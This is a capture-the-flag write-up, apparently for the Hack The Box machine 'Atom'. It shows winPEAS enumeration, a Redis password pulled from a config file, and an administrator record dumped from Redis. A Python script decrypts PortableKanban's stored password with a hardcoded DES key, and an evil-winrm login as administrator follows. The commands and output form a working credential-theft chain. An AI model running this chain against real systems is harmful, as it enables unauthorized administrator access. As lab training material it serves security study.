### 1. Using winpeas for Enumeration:

![[Pasted image 20210614151853.png]]

![[Pasted image 20210614153253.png]]

![[Pasted image 20210614154038.png]]

![[Pasted image 20210614152953.png]]

![[Pasted image 20210614153602.png]]

### 2.Checking the "C:\Program Files\Redis\redis.windows-service.conf":

```bash
C:\Program Files\Redis>type redis.windows-service.conf                                                                                                        
type redis.windows-service.conf                                                                                                                               
# Redis configuration file example                                                                                                                            
requirepass kidvscat_yes_kidvscat
```

** Found Password - `kidvscat_yes_kidvscat`**

### 3.Connecting to Redis CLI using the above password:

```bash
root@napster:~/Documents/HTB/Atom# redis-cli -h 10.10.10.237 -a kidvscat_yes_kidvscat
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.10.237:6379> keys *
1) "pk:ids:User"
2) "pk:ids:MetaDataClass"
3) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
4) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
10.10.10.237:6379> get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
"{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253}"
10.10.10.237:6379>
```

#### Encrypted Password-`Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi`

### 4. After Googling we came across PortableKanban Encrypted Password Disclosure:

`decrypt.py:`

```bash
import json
import base64
from des import * #python3 -m pip install des

try:
    hash = str(input("Enter the Hash : "))
    hash = base64.b64decode(hash.encode('utf-8'))
    key = DesKey(b"7ly6UznJ")
    print("Decrypted Password : " + key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))
except:
    print("Wrong Hash")
```

```bash
root@napster:~/Documents/HTB/Atom# python3 decrypt.py 
Enter the Hash : Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
Decrypted Password : kidvscat_admin_@123
```

** Password-kidvscat_admin_@123**

### 5.Logging in via Evil-winrm/Root.txt:

```bash
root@napster:~/Documents/HTB/Atom# evil-winrm -i 10.10.10.237 -u 'administrator' -p 'kidvscat_admin_@123'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
atom\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         6/14/2021   9:52 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
d39572b62683f507e02b539e2afbde92
```